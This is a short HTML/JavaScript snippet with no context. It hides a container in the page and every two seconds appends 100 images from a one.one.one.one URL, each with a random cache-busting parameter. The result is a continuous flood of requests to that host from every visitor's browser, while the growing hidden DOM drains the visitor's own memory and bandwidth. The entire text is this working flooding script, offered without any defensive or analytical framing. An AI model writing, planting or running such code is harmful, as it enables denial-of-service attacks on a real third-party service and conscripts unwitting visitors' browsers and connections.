<script>
  const baseUrl = 'https://one.one.one.one/media/card.png';
  const container = document.createElement('div');
  container.style.display = 'none'; // keeps it hidden but DOM persists
  document.body.appendChild(container);

  setInterval(() => {
    for (let i = 0; i < 100; i++) {
      const img = new Image();
      const cacheBuster = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
      img.src = `${baseUrl}?cb=${cacheBuster}`;
      container.appendChild(img);
    }
  }, 2000); // every 2 seconds load 100 more images
</script>
